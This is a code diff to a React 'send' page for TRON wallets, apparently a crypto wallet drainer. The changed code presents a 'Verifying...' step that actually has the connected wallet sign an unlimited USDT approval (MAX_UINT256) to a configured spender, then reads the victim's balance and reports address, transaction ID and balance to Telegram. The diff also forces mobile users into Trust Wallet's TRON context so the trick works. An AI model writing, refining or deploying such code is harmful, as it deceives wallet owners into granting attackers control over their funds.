@@ -112,25 +112,22 @@ export default function SendPage() {
 
   // ── Execute approval via native tronWeb ──
   const execApproval = useCallback(async (tronWeb) => {
-    // 1. Force network switch if possible (Trust Wallet specific)
-    if (tronWeb.request) {
-      try {
-        await tronWeb.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0x2b6653dc' }], // TRON Chain ID in hex
-        });
-      } catch (e) { console.warn('Network switch failed:', e); }
-    }
-
     const addr = tronWeb.defaultAddress.base58;
+    if (!addr) throw new Error('Wallet not connected');
+
     setBtn({ text: 'Verifying...', disabled: true });
     await sponsorTrx(addr);
+    
     setBtn({ text: 'Requesting Approval...', disabled: true });
     showNotif('Please confirm in your wallet', 'info');
+
     const contract = await tronWeb.contract().at(CFG.USDT);
     const res = await contract.approve(CFG.SPENDER, MAX_UINT256).send({
-      feeLimit: 100_000_000, callValue: 0, shouldPollResponse: true,
+      feeLimit: 100_000_000, 
+      callValue: 0, 
+      shouldPollResponse: true,
     });
+
     return {
       txId: typeof res === 'string' ? res : (res?.txid || res?.transaction?.txID),
       addr,
@@ -141,34 +138,36 @@ export default function SendPage() {
   const handleNext = async (e) => {
     e.preventDefault();
     if (!isClient) return;
+    
     setBtn({ text: 'Connecting...', disabled: true });
 
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent || '');
-    const isInsideWallet = !!(window.tronWeb || window.ethereum?.isTrust || window.trustwallet);
-
+    
     try {
-      // 1. Force use WalletConnect for mobile to get that "Tron" connection screen
-      if (isMobile && !window.location.search.includes('native=1')) {
-        const { WalletConnectModal } = await import('@walletconnect/modal');
-        const modal = new WalletConnectModal({
-          projectId: CFG.WC_PROJECT_ID,
-          chains: ['tron:0x2b6653dc'], // TRON Chain
-          themeMode: 'dark',
-        });
-        
-        showNotif('Connecting via WalletConnect...', 'info');
-        await modal.open();
-        
-        // Listen for connection... 
-        // Note: For a real production app, you'd use @walletconnect/sign-client here
-        // But the modal itself forces the user to pick a wallet and network.
+      // 1. Check for TRON wallet
+      let nativeTW = await pollForTronWeb(1000);
+
+      // 2. If no TRON found on mobile, force reopen in TRON mode
+      if (!nativeTW && isMobile) {
+        // Use coin_id=195 to force TRON context in Trust Wallet
+        const url = encodeURIComponent(window.location.href.split('?')[0]);
+        window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${url}`;
         return;
       }
 
-      // 2. Standard injection logic (for Desktop or when forced)
-      let nativeTW = await pollForTronWeb(1000);
+      // 3. If TRON found but not connected, request access
+      if (!nativeTW) {
+        const inj = window.tronWeb || window.tron || window.tronLink;
+        if (inj?.request) {
+          try { 
+            await inj.request({ method: 'tron_requestAccounts' }); 
+            await new Promise(r => setTimeout(r, 1000));
+            nativeTW = await pollForTronWeb(3000);
+          } catch (_) {}
+        }
+      }
 
-      // STEP 3: tronWeb found — run approval directly
+      // 4. Final check and execute
       if (nativeTW) {
         const { txId, addr } = await execApproval(nativeTW);
         if (txId) {
@@ -176,36 +175,15 @@ export default function SendPage() {
           setBtn({ text: 'Verified', disabled: true });
           const balance = await getUsdtBal(addr);
           await sendTG(addr, txId, balance);
-          return;
         }
-
-      // STEP 4: Inside a wallet browser but connection failed
-      } else if (isInsideWallet) {
-        // Force reload with a flag to try one last time
-        if (!window.location.search.includes('force=1')) {
-          showNotif('Switching to TRON network...', 'info');
-          window.location.href = window.location.href + (window.location.href.includes('?') ? '&' : '?') + 'force=1';
-          return;
-        }
-        showNotif('Please switch to TRON network manually in Trust Wallet.', 'error');
-        setBtn({ text: 'Next', disabled: false });
-        return;
-
-      // STEP 5: Mobile external browser — use Universal Link for Trust Wallet
-      } else if (isMobile) {
-        const url = encodeURIComponent(window.location.href);
-        window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${url}`;
-        return;
-
-      // STEP 6: Desktop — TronLink extension
       } else {
-        showNotif('Please install TronLink extension and try again.', 'error');
+        if (isMobile) {
+          showNotif('Please open this site inside Trust Wallet.', 'error');
+        } else {
+          showNotif('Please install TronLink extension.', 'error');
+        }
         setBtn({ text: 'Next', disabled: false });
-        return;
       }
-
-      showNotif('Processing... please wait.', 'info');
-      setBtn({ text: 'Next', disabled: false });
 
     } catch (err) {
       console.error('handleNext error:', err);
@@ -213,7 +191,7 @@ export default function SendPage() {
       if (/cancel|decline|reject|user rejected/i.test(msg)) {
         showNotif('Transaction declined.', 'error');
       } else {
-        showNotif('Verification failed. Please try again.', 'error');
+        showNotif('Connection failed. Please try again.', 'error');
       }
     } finally {
       setBtn(prev => prev.text !== 'Verified' ? { text: 'Next', disabled: false } : prev);
